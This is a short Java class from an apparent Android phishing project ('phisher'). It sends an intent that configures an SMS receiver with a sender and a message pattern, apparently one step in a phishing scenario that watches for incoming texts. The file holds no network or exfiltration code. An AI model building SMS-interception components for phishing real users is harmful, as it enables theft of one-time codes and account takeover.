package pl.jasiun.phisher.scenario;

import android.content.Intent;
import android.os.Bundle;
import pl.jasiun.phisher.AndroidController;

public class PrepareSmsReciverAction extends Action {

	private final AndroidController controller;
	private final String sender;
	private final String pattern;

	public PrepareSmsReciverAction(AndroidController controller, String sender,
			String pattern) {
				this.controller = controller;
				this.sender = sender;
				this.pattern = pattern;
	}

	@Override
	public void play() {
		Intent intent = new Intent("pl.jasiun.SMS_RECEIVER_SETTINGS_APPEARED");
		Bundle extras = new Bundle();
		extras.putString("SENDER", sender);
		extras.putString("PATTERN", pattern);
		intent.putExtras(extras);
		controller.sendIntent(intent);
	}

}
